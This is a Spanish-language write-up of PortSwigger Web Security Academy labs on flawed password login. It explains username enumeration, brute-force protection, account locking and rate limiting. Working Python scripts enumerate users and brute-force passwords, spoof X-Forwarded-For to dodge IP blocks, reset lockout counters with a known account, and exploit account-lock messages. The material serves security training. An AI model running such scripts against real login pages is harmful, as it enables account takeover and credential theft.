---
description: https://portswigger.net/web-security/authentication/password-based
---

# Vulnerabilities in password-based login

## Brute-force attacks

Un ataque de fuerza bruta es cuando un atacante utiliza un sistema de prueba y error en un intento de adivinar credenciales de usuario válidas. Estos ataques normalmente se automatizan utilizando listas de palabras de nombres de usuario y contraseñas. Automatizar este proceso, especialmente mediante herramientas dedicadas, potencialmente permite a un atacante realizar un gran número de intentos de inicio de sesión a alta velocidad.

Forzar intentos no siempre es solo un caso de hacer secuencias completamente aleatorias en nombres de usuario y contraseñas. Al usar también la lógica básica o el conocimiento disponible públicamente, los atacantes pueden afinar los ataques de fuerza bruta para hacer secuencias mucho más efectivas. Esto aumenta considerablemente la eficiencia de tales ataques. Los sitios web que se basan en el inicio de sesión basado en contraseñas como su único método para autenticar a los usuarios pueden ser altamente vulnerables si no implementan suficiente protección contra la fuerza bruta.

## Brute-forcing usernames

Los nombres de usuario son especialmente fáciles de adivinar si se ajustan a un patrón reconocible, como una dirección de correo electrónico. Por ejemplo, es muy común ver inicios de sesión empresariales en el formato firstname.lastname@somecompany.com. Sin embargo, incluso si no hay un patrón obvio, a veces incluso las cuentas con privilegios altos se crean utilizando nombres de usuario predecibles, como administrador o administrador.

Durante la auditoría, compruebe si el sitio web divulga los nombres de usuario potenciales públicamente. Por ejemplo, ¿puede acceder a los perfiles de usuario sin iniciar sesión? Incluso si el contenido real de los perfiles está oculto, el nombre utilizado en el perfil es a veces el mismo que el nombre de usuario de inicio de sesión. También debe comprobar las respuestas HTTP para ver si se divulga alguna dirección de correo electrónico. Ocasionalmente, las respuestas contienen direcciones de correo electrónico de usuarios con privilegios altos, como administradores y soporte de TI.

## Brute-forcing passwords

Las contraseñas pueden ser igualmente susceptibles a ataques de fuerza bruta, con la dificultad variando en función de la fuerza de la contraseña. Muchos sitios web adoptan algún tipo de política de contraseñas, que obliga a los usuarios a crear contraseñas seguras, teóricamente al menos, más difíciles de descifrar usando fuerza bruta. Esto normalmente implica la aplicación de contraseñas con:

* Un número mínimo de caracteres
* Una mezcla de letras minúsculas y mayúsculas
* Al menos un personaje especial

Sin embargo, mientras que las contraseñas seguras son difíciles de descifrar solos para los ordenadores, podemos utilizar un conocimiento básico del comportamiento humano para explotar las vulnerabilidades que los usuarios introducen involuntariamente en este sistema. En lugar de crear una contraseña segura con una combinación aleatoria de caracteres, los usuarios a menudo toman una contraseña que pueden recordar e intentan lanzarla para adaptarla a la directiva de contraseñas. Por ejemplo, si no se permite mypassword, los usuarios pueden probar algo como Mypassword1! o Myp4\$$w0rd en su lugar.

En los casos en que la directiva requiere que los usuarios cambien sus contraseñas de forma regular, también es común que los usuarios solo realicen cambios menores y predecibles en su contraseña preferida. Por ejemplo, Mypassword1! se convierte en Mypassword1? o Mypassword2!.

Este conocimiento de credenciales probables y patrones predecibles significa que los ataques de fuerza bruta a menudo pueden ser mucho más sofisticados y, por lo tanto, eficaces, que simplemente iterar a través de todas las combinaciones posibles de caracteres.

## Username enumeration

La enumeración del nombre de usuario es cuando un atacante puede observar los cambios en el comportamiento del sitio web para identificar si un nombre de usuario determinado es válido.

La enumeración de nombre de usuario normalmente se produce en la página de inicio de sesión, por ejemplo, cuando se introduce un nombre de usuario válido pero una contraseña incorrecta, o en formularios de registro cuando se introduce un nombre de usuario que ya está tomado. Esto reduce en gran medida el tiempo y el esfuerzo necesarios para forzar bruscamente un inicio de sesión porque el atacante es capaz de generar rápidamente una lista de nombres de usuario válidos.

Al intentar forzar bruscamente una página de inicio de sesión, debe prestar especial atención a cualquier diferencia en:

* **Códigos de estado**: durante un ataque de fuerza bruta, es probable que el código de estado HTTP devuelto sea el mismo para la gran mayoría de las respuestas porque la mayoría de ellas serán incorrectas. Si una respuesta devuelve un código de estado diferente, esta es una fuerte indicación de que el nombre de usuario era correcto. Es recomendable que los sitios web devuelvan siempre el mismo código de estado independientemente del resultado, pero esta práctica no siempre se sigue.
* **Mensajes de error**: a veces el mensaje de error devuelto es diferente dependiendo de si tanto el nombre de usuario como la contraseña son incorrectos o solo la contraseña era incorrecta. Es recomendable que los sitios web utilicen mensajes idénticos y genéricos en ambos casos, pero a veces se producen pequeños errores de escritura. Solo un carácter fuera de lugar hace que los dos mensajes sean distintos, incluso en los casos en que el carácter no está visible en la página renderizada.
* **Tiempos de respuesta**: Si la mayoría de las solicitudes se manejaron con un tiempo de respuesta similar, cualquiera que se desvíe de esto sugiere que algo diferente estaba sucediendo detrás de las escenas. Esta es otra indicación de que el nombre de usuario adivinado podría ser correcto. Por ejemplo, un sitio web solo puede comprobar si la contraseña es correcta si el nombre de usuario es válido. Este paso adicional puede causar un ligero aumento en el tiempo de respuesta. Esto puede ser sutil, pero un atacante puede hacer este retraso más obvio al introducir una contraseña excesivamente larga que el sitio web tarda notablemente más en manejar.

### Lab: Username enumeration via different responses

Vamos a ocupar dos diccionarios para este ejercicio, una para identificar los usuarios y otro para identificar las contraseñas con base en los usuarios validados. Podemos hacer esto desde Burp Suite, pero vamos a realizar este proceso con Python.

Explicación del código.

* **read\_file(file)**, lee los ficheros password y usernames para almacenarlos en una lista.
* **velid\_usernames(url,usernames)**, con base a la lista generada de usuarios realizará una petición para comprobar si la longitud es diferente al valor que más aparece.
* **valid\_password(url, valid\_usernames, passwords)**, con base a los usuarios validados, se realizará una petición para comprobar cuáles son los usuarios con password correcto.
* **def\_handler(key,frame)**, para realizar una salida exitosa, si pulsamos ctrl + c.
* **pretty(valid\_passwords)**, muestra los resultados.
* **main()**, método principal, donde se observa el flujo del script.

Cabe a resaltar que el script está realizado para detectar múltiples usuarios válidos con su respectiva contraseña.

```python
import requests, signal, sys

def read_file(file):
    
    content = []

    f = open(file, "r")
    while(True):
        linea = f.readline().rstrip('\n')
        content.append(linea)
        if not linea:
            break
    f.close()

    del content[-1]
    return content

def valid_username(url, usernames):

    valid_usernames = []

    for username in usernames:
        response_user = requests.post(url=url,data={"username":username,"password":"qwerty"})
        print("Usuario: {}\tlongitud: {}".format(username,len(response_user.content)))
        # cambiar el valor 5077 por el valor que te aparece a ti
        if len(response_user._content) != 5077:
            valid_usernames.append(username)

    print("\nLos usuarios validos son: {}".format(','.join(valid_usernames)))
    return valid_usernames

def valid_password(url, valid_usernames, passwords):

    valid_password = dict.fromkeys(valid_usernames, '')

    for username in valid_usernames:
        for password in passwords:
            response_pass = requests.post(url=url,data={"username":username,"password":password})
            print("Validando password: {}\tpara usuario: {}\tLongitud: {}".format(password,username,len(response_pass.content)))
            # cambiar el valor 5079 por el valor que te aparece a ti
            if len(response_pass._content) != 5079:
                valid_password[username] = password

    return valid_password

def def_handler(key,frame):
    
    print("\n[*] Saliendo")
    sys.exit(1)

def pretty(valid_passwords):
    
    for key, value in valid_passwords.items():
        print("{}:{}".format(key,value))

def main():

    signal.signal(signal.SIGINT, def_handler)

    url = "https://acf71f171e32b33880800fb9003000ef.web-security-academy.net/login"

    print("\n[*] Validando username\n")
    usernames = read_file("usernames")
    valid_usernames = valid_username(url, usernames)

    print("\n[*] Validando password\n")
    passwords = read_file("passwords")
    valid_passwords = valid_password(url, valid_usernames, passwords)

    pretty(valid_passwords)

if __name__ == "__main__":
    main()
```

Resultado.

![](<../../.gitbook/assets/image (23).png>)

Iniciamos sesión con los datos obtenidos.

![](<../../.gitbook/assets/image (9).png>)

### Lab: Username enumeration via subtly different responses

En este ejercicio vamos a filtrar por una expresión regular, la cual será el mensaje de error que se nos muestra. Es muy similar a lo que hicimos el ejercicio pasado, pero ahora vamos a filtrar por el mensaje, ya que la longitud varía con cada petición.

![](<../../.gitbook/assets/image (82).png>)

Utilizaré el código pasado, pero realizaré los ajustes para que busque por la expresión y en busca de una redirección.

Explicación del código.

* **read\_file(file)**, lee los ficheros password y usernames para almacenarlos en una lista.
* **velid\_usernames(url,usernames)**, con base a la lista generada de usuarios realizará una petición para comprobar si existe un patrón el cual será el mensaje de error devuelto por el servidor.
* **valid\_password(url, valid\_usernames, passwords)**, con base a los usuarios validados, se realizará una petición para comprobar cuáles son los usuarios con password correcto, el password correcto será aquel que haga una redirección.
* **def\_handler(key,frame)**, para realizar una salida exitosa, si pulsamos ctrl + c.
* **pretty(valid\_passwords)**, muestra los resultados.
* **main()**, método principal, donde se observa el flujo del script.

Cabe a resaltar que el script está realizado para detectar múltiples usuarios válidos con su respectiva contraseña.

```python
import requests, signal, sys, re

def read_file(file):
    
    content = []

    f = open(file, "r")
    while(True):
        linea = f.readline().rstrip('\n')
        content.append(linea)
        if not linea:
            break
    f.close()

    del content[-1]
    return content

def valid_username(url, usernames, pattern):

    valid_usernames = []

    for username in usernames:
        response_user = requests.post(url=url,data={"username":username,"password":"qwerty"})        
        text_clearn = " ".join(re.sub(re.compile('<.*?>'), '', response_user.text).split())
        #print("Usuario: {}".format(username))

        if pattern in text_clearn:
            pass
        else:            
            valid_usernames.append(username)

    print("\nLos usuarios validos son: {}".format(','.join(valid_usernames)))
    return valid_usernames

def valid_password(url, valid_usernames, passwords, pattern):

    valid_password = dict.fromkeys(valid_usernames, '')

    for username in valid_usernames:
        for password in passwords:
            response_pass = requests.post(url=url,data={"username":username,"password":password}, allow_redirects=False)
            #print("Validando password: {}\t\tpara usuario: {}\t\tCodigo de estado: {}".format(password,username,response_pass.status_code))
            
            if response_pass.status_code == 200:
                pass
            else:
                valid_password[username] = password

    return valid_password

def def_handler(key,frame):
    
    print("\n[*] Saliendo")
    sys.exit(1)

def pretty(valid_passwords):
    
    for key, value in valid_passwords.items():
        print("\n[*] {}:{}".format(key,value))

def main():

    signal.signal(signal.SIGINT, def_handler)

    url = "https://acc61fa41fb4c60f80d711a700b200d8.web-security-academy.net/login"
    pattern = "Invalid username or password."


    print("\n[*] Validando username\n")
    usernames = read_file("usernames")
    valid_usernames = valid_username(url, usernames, pattern)

    print("\n[*] Validando password\n")
    passwords = read_file("passwords")
    valid_passwords = valid_password(url, valid_usernames, passwords, pattern)

    pretty(valid_passwords)

if __name__ == "__main__":
    main()
```

Resultado.

![](<../../.gitbook/assets/image (5) (1).png>)

Iniciamos sesión con los datos obtenidos.

![](<../../.gitbook/assets/image (99).png>)

### Lab: Username enumeration via response timing

Con el candidato usuario y contraseña, `wiener:peter` vamos a hacer una petición y la vamos a capturar con Burp.

![](<../../.gitbook/assets/image (1) (1).png>)

Si volvemos a enviar la petición un par de veces más, aparecerá el siguiente mensaje.

![](<../../.gitbook/assets/image (44).png>)

Buscando una forma de realizar un bypass, me encontré que a través del header X-Forwarded-For (enlaces en el apartado del final).

Explicación del código.

* **read\_file(file)**, lee los ficheros password y usernames para almacenarlos en una lista.
* **velid\_usernames(url,usernames)**, con base a la lista generada de usuarios realizará una petición para comprobar si existe un usuario donde el tiempo de respuesta sea mayor a 1 segundo, este tiempo lo saque primero observando el comportamiento y con una contraseña aleatoria entre 120,150 caracteres, se añadió la cabecera X-Forwarded-For con valor de 1 al 100.
* **valid\_password(url, valid\_usernames, passwords),** con base a los usuarios validados, se realizará una petición para comprobar cuáles son los usuarios con password correcto, el password correcto será aquel que haga una redirección, se añadió la cabecera X-Forwarded-For con valor de 1 al 100.
* **def\_handler(key,frame)**, para realizar una salida exitosa, si pulsamos ctrl + c.
* **pretty(valid\_passwords)**, muestra los resultados.
* **main()**, método principal, donde se observa el flujo del script.

```python
import requests, signal, sys, string, random

def read_file(file):
    
    content = []

    f = open(file, "r")
    while(True):
        linea = f.readline().rstrip('\n')
        content.append(linea)
        if not linea:
            break
    f.close()

    del content[-1]
    return content

def valid_username(url, usernames):

    valid_usernames = []

    for username in usernames:
        headers = {'X-Forwarded-For':str(int(usernames.index(username)+.0)+1)}
        password = ''.join(random.choice(string.ascii_letters) for i in range(random.randint(120,150)))
        data = {"username":username,"password":password}

        response_user = requests.post(url=url, data=data, headers=headers)
        #print("Usuario: {}\t\tTiempo {}".format(username, response_user.elapsed.total_seconds()))

        #Se observo que una peticion se exedia del rango promedio 0.5 a 0.65.
        if int(response_user.elapsed.total_seconds()) >= 1:
            valid_usernames.append(username)
        else:
            pass

    print("\nLos usuarios validos son: {}".format(','.join(valid_usernames)))
    return valid_usernames

def valid_password(url, valid_usernames, passwords):

    valid_password = dict.fromkeys(valid_usernames, '')

    for username in valid_usernames:
        for password in passwords:
            headers = {'X-Forwarded-For':str(int(passwords.index(password)+.0)+1)}
            data = {"username":username,"password":password}
            
            response_pass = requests.post(url=url, data=data, headers=headers, allow_redirects=False)
            #print("Validando password: {}\t\tUsuario: {}\t\tCodigo de estado:{}".format(password,username,response_pass.status_code))

            if response_pass.status_code == 200:
                pass
            else:
                valid_password[username] = password

    return valid_password

def def_handler(key,frame):
    
    print("\n[*] Saliendo")
    sys.exit(1)

def pretty(valid_passwords):
    
    for key, value in valid_passwords.items():
        print("\n[*] {}:{}".format(key,value))

def main():

    signal.signal(signal.SIGINT, def_handler)

    url = "https://ac051f621e4f3a98808be13e00bd0048.web-security-academy.net/login"

    print("\n[*] Validando username\n")
    usernames = read_file("usernames")
    valid_usernames = valid_username(url, usernames)

    print("\n[*] Validando password\n")
    passwords = read_file("passwords")
    valid_passwords = valid_password(url, valid_usernames, passwords)

    pretty(valid_passwords)

if __name__ == "__main__":
    main()
```

Resultado.

![](<../../.gitbook/assets/image (116).png>)

Iniciamos sesión con los datos obtenidos.

![](<../../.gitbook/assets/image (108).png>)

## Flawed brute-force protection

Es muy probable que un ataque de fuerza bruta involucre muchas secuencias fallidas antes de que el atacante comprometa con éxito una cuenta. Lógicamente, la protección con fuerza bruta gira en torno a tratar de que sea lo más difícil posible automatizar el proceso y ralentizar la velocidad a la que un atacante puede intentar iniciar sesión. Las dos formas más comunes de prevenir ataques con fuerza bruta son:

* Bloquear la cuenta a la que el usuario remoto está intentando acceder si realiza demasiados intentos de inicio de sesión fallidos.
* Bloquear la dirección IP del usuario remoto si realiza demasiados intentos de inicio de sesión en rápida sucesión.

Ambos enfoques ofrecen diferentes grados de protección, pero ninguno es invulnerable, especialmente si se implementa utilizando la lógica defectuosa.

Por ejemplo, a veces puede encontrar que su IP está bloqueada si no puede iniciar sesión demasiadas veces. En algunas implementaciones, el contador para el número de intentos fallidos se restablece si el propietario de IP inicia sesión correctamente. Esto significa que un atacante simplemente tendría que iniciar sesión en su propia cuenta cada pocos intentos para evitar que se alcance este límite.

En este caso, simplemente incluir sus propias credenciales de inicio de sesión a intervalos regulares a lo largo de la lista de palabras es suficiente para hacer esta defensa virtualmente inútil.&#x20;

### Lab: Broken brute-force protection, IP block

Intentamos iniciar sesión un para de veces con el usuario `carlos`, vemos que cuenta con protección para no realizar ataques de fuerza bruta. Pero con base en lo que se nos menciona en el texto anterior podemos hacer un reinicio de este tiempo si iniciamos sesión con otra cuenta, por lo tanto, vamos a aprovecharnos de este funcionamiento, se nos proporcionan unas credenciales `wiener:peter`.

![](<../../.gitbook/assets/image (76).png>)

Explicación del código.

* **read\_file(file)**, lee los ficheros password y usernames para almacenarlos en una lista.
* **reset\_time(url)**, envía una petición con el usuario autenticado.
* **valid\_password(url, valid\_usernames, passwords)**, con base al usuario `carlos` se identificará la contraseña si se encuentra una redirección.
* **def\_handler(key,frame)**, para realizar una salida exitosa, si pulsamos ctrl + c.
* **pretty(valid\_passwords)**, muestra los resultados.
* **main()**, método principal, donde se observa el flujo del script.

```python
import requests, signal, sys

def read_file(file):
    
    content = []

    f = open(file, "r")
    while(True):
        linea = f.readline().rstrip('\n')
        content.append(linea)
        if not linea:
            break
    f.close()

    del content[-1]
    return content

def reset_time(url):
    
    response = requests.post(url=url, data={"username":"wiener","password":"peter"})

def valid_password(url, valid_usernames, passwords):

    valid_password = dict.fromkeys(valid_usernames, '')

    for username in valid_usernames:
        for password in passwords:
            reset_time(url)
            response_pass = requests.post(url=url,data={"username":username,"password":password}, allow_redirects=False)
            #print("Validando password: {}\tUsuario: {}\t".format(password,username))

            if response_pass.status_code == 200:
                pass
            else:
                valid_password[username] = password

    return valid_password

def def_handler(key,frame):
    
    print("\n[*] Saliendo")
    sys.exit(1)

def pretty(valid_passwords):
    
    for key, value in valid_passwords.items():
        print("\n[*] {}:{}".format(key,value))

def main():

    signal.signal(signal.SIGINT, def_handler)

    url = "https://ac081f5c1e720d7680553b5a009f00b8.web-security-academy.net/login"
    valid_usernames=["carlos"]

    print("\n[*] Validando password\n")
    passwords = read_file("passwords")
    valid_passwords = valid_password(url, valid_usernames, passwords)

    pretty(valid_passwords)

if __name__ == "__main__":
    main()
```

Resultado.

![](<../../.gitbook/assets/image (62).png>)

Iniciamos sesión con los datos obtenidos.

![](<../../.gitbook/assets/image (70).png>)

## Account locking

Una forma en que los sitios web tratan de evitar la fuerza bruta es bloquear la cuenta si se cumplen ciertos criterios sospechosos, por lo general un número determinado de intentos de inicio de sesión fallidos. Al igual que con los errores de inicio de sesión normales, las respuestas del servidor que indican que una cuenta está bloqueada también pueden ayudar a un atacante a enumerar nombres de usuario.

El bloqueo de una cuenta ofrece una cierta cantidad de protección contra la fuerza bruta dirigida de una cuenta específica. Sin embargo, este enfoque no impide adecuadamente ataques de fuerza bruta en los que el atacante sólo está tratando de obtener acceso a cualquier cuenta aleatoria que puedan.

Por ejemplo, el siguiente método se puede utilizar para evitar este tipo de protección:

* Establezca una lista de nombres de usuario candidatos que probablemente sean válidos. Esto podría ser a través de la enumeración de nombre de usuario o simplemente basado en una lista de nombres de usuario comunes.&#x20;
* Decida una lista de contraseñas muy pequeña que cree que es probable que tenga al menos un usuario. Crucialmente, el número de contraseñas que seleccione no debe exceder el número de intentos de inicio de sesión permitidos. Por ejemplo, si ha resuelto que el límite es de 3 intentos, debe elegir un máximo de 3 conjeturas de contraseña.&#x20;
* Con una herramienta como Burp Intruder, prueba cada una de las contraseñas seleccionadas con cada uno de los nombres de usuario candidatos. De esta manera, puede intentar forzar todas las cuentas sin desencadenar el bloqueo de la cuenta. Usted necesita solamente un solo usuario para utilizar una de las tres contraseñas para comprometer una cuenta.&#x20;

El bloqueo de cuentas tampoco protege contra los ataques de stuffing attacks. Esto implica el uso de un diccionario masivo de pares `username:password`, compuesto por credenciales de inicio de sesión genuinas robadas en violaciones de datos. Credential stuffing se basa en el hecho de que muchas personas reutilizan el mismo nombre de usuario y contraseña en varios sitios web y, por lo tanto, existe la posibilidad de que algunas de las credenciales comprometidas en el diccionario también sean válidas en el sitio web de destino. El bloqueo de cuentas no protege contra el credential stuffing porque cada nombre de usuario solo se intenta una vez. Credential stuffing es particularmente peligroso porque a veces puede resultar en que el atacante comprometa muchas cuentas diferentes con un solo ataque automatizado.&#x20;

### Lab: Username enumeration via account lock

Debemos de capturar primero el usuario correcto, esto lo podemos hacer mediante las respuestas que envia el servidor, iremos iterando con cada nombre de usuario hasta encontrar un usuario al que se le bloquee la cuenta. SI obtenemos como respuesta "You have made too many incorrect login attempts. Please try again in 1 minute(s)." Significara que el usuario existe, ahora que tenemos un usuario podemos realizar un ataque de fuerza bruta.

Explicación del código.

* **def\_handler(key,frame), para realizar una salida exitosa, si pulsamos ctrl + c.**
* **parse(response)**, basicamente un HTML to text, en el cual buscaremos el mensaje de bloqueo.
* **read\_file(file)**, lee los ficheros password y usernames para almacenarlos en una lista.
* **check\_usernames(url, usernames)**, recibe la url y la lista de los usuarios a iterar.
* **check\_passwords(username,url,passwords)**, una vez obtenido el nombre de usuario, en base a una lista de passwords se hara un ataque de fuerza bruta, como resultado posibles contraseña.
* **main()**, método principal, donde se observa el flujo del script.

```python
import sys, signal, requests, re
from bs4 import BeautifulSoup
from requests.models import requote_uri

def def_handler(key,frame):
    print("\n[*] Saliendo")
    sys.exit(1)

def parse(response):
    lines = BeautifulSoup(response.text, "lxml").text.split("\n")
    non_empty_lines = [line for line in lines if line.strip() != ""]
    string_without_empty_lines = ""
    for line in non_empty_lines:
        string_without_empty_lines += line + "\n"
    return string_without_empty_lines

def read_file(file):
    content = []

    f = open(file, "r")
    while(True):
        linea = f.readline().rstrip('\n')
        content.append(linea)
        if not linea:
            break
    f.close()

    del content[-1]
    return content

def check_usernames(url,usernames):
    message = "You have made too many incorrect login attempts. Please try again in 1 minute(s)."
    for user in usernames:
        for num in range(1,6):
            data = {"username":"{}".format(user),"password":"{}".format(num)}
            r = requests.post(url=url,data=data)
            if re.search(message[0],parse(r)):
                return user                

def check_passwords(username,url,passwords):
    message = "You have made too many incorrect login attempts. Please try again in 1 minute(s)."
    password_possible = []
    for password in passwords:
        data = {"username":"{}".format(username),"password":"{}".format(password)}
        r = requests.post(url=url,data=data)
        if not re.search(message[0],parse(r)):
            password_possible.append(password)
    return password_possible

def main():
    url = "https://ac5f1f3f1fdfef2b80376f9b00fd00c1.web-security-academy.net/login"

    usernames = read_file("usernames")
    username = check_usernames(url,usernames)
    print("Username: {}".format(username))

    passwords = read_file("passwords")
    password = check_passwords(username,url,passwords)
    print("Posibles passwords: {}".format(password))

if __name__ == "__main__":
    signal.signal(signal.SIGINT,def_handler)
    main()
```

## User rate limiting

Otra forma en que los sitios web tratan de prevenir ataques de fuerza bruta es a través de la limitación de la tasa de usuario. En este caso, realizar demasiadas solicitudes de inicio de sesión en un corto período de tiempo hace que su dirección IP se bloquee. Normalmente, la IP solo se puede desbloquear de una de las siguientes maneras:

* Automáticamente después de un cierto período de tiempo ha transcurrido
* Manualmente por un administrador
* Manualmente por el usuario después de completar con éxito un CAPTCHA

A veces se prefiere limitar la velocidad de usuario al bloqueo de cuentas debido a ser menos propenso a la enumeración de nombre de usuario y a los ataques de denegación de servicio. Sin embargo, todavía no es completamente seguro. Como vimos un ejemplo de en un laboratorio anterior, hay varias maneras en que un atacante puede manipular su IP aparente con el fin de eludir el bloque.

Como el límite se basa en la velocidad de las solicitudes HTTP enviadas desde la dirección IP del usuario, a veces también es posible omitir esta defensa si puede averiguar cómo adivinar varias contraseñas con una sola solicitud

### Lab: Broken brute-force protection, multiple credentials per request

Lo primero que haremos es interpectar un inicio de sesion con burpsuite, esto para ver como viajan los datos en la peticion, los datos se transmiten en formato JSON, por lo tanto podemos crear un arreglo con todos las contrasenas para probar si es vulnerable, en caso de obtener un codigo de estado 302, el sitio sera vulnerable.

![](<../../.gitbook/assets/image (106).png>)

Generamos un arreglo con los passwords. Con los ejemplos anteriores se lo podemos obtener de manera muy sencilla, con el siguiente codigo:

```python
def read_file(file):
    content = []

    f = open(file, "r")
    while(True):
        linea = f.readline().rstrip('\n')
        content.append(linea)
        if not linea:
            break
    f.close()

    del content[-1]
    return content

def main():
    usernames = read_file("passwords")
    print(usernames)

if __name__ == "__main__":
    main()
```

Una vez generado debemos de reemplazar las comillas simples con comillas dobles, esto lo podemos hacer con el editor de texto de preferencia. Una vez tengamos el arreglo, podemos enviar la peticion, solo remplazamos el caracter por el arreglo y enviamos la peticion.

![](<../../.gitbook/assets/image (49).png>)

En la respuesta damos clic derecho `Request in Show response in browser`.

![](<../../.gitbook/assets/image (50).png>)

Copiamos en enlace y lo pegamos en el navegador, el resultado es el siguiente:

![](<../../.gitbook/assets/image (63).png>)

## HTTP basic authentication

Aunque bastante antiguo, su relativa simplicidad y facilidad de implementación significa que a veces puede ver la autenticación básica HTTP que se utiliza. En la autenticación básica HTTP, el cliente recibe un token de autenticación del servidor, que se construye concatenando el nombre de usuario y la contraseña, y codificarlo en Base64. Este token es almacenado y administrado por el explorador, que lo agrega automáticamente al encabezado Authorization de cada solicitud posterior de la siguiente manera:

Autorización: Base básica64 (nombre de usuario:contraseña)

Por varias razones, esto generalmente no se considera un método de autenticación seguro. En primer lugar, implica enviar repetidamente las credenciales de inicio de sesión del usuario con cada solicitud. A menos que el sitio web también implemente HSTS, las credenciales de usuario están abiertas a ser capturadas en un ataque de hombre en el medio.

Además, las implementaciones de la autenticación básica HTTP a menudo no admiten la protección con fuerza bruta. Dado que el token consta exclusivamente de valores estáticos, esto puede dejarlo vulnerable a fuerza bruta.

La autenticación básica HTTP también es particularmente vulnerable a los exploits relacionados con la sesión, en particular CSRF, contra los que no ofrece ninguna protección por sí solo.

En algunos casos, explotar la autenticación básica HTTP vulnerable solo podría conceder a un atacante acceso a una página aparentemente desinteresada. Sin embargo, además de proporcionar una nueva superficie de ataque, las credenciales expuestas de esta manera podrían reutilizarse en otros contextos más confidenciales.

## Enlaces de referencia.

{% embed url="https://developer.mozilla.org/es/docs/Web/HTTP/Headers/X-Forwarded-For" %}

{% embed url="https://danasmera.com/spoof-x-forwarded-for-xff-header-using-requests-module" %}

{% embed url="https://subscription.packtpub.com/book/networking_and_servers/9781784395414/1/ch01lvl1sec18/tracking-redirection-of-the-request-using-request-history" %}

{% embed url="https://www.codewatch.org/blog/?p=408" %}

{% embed url="https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c" %}

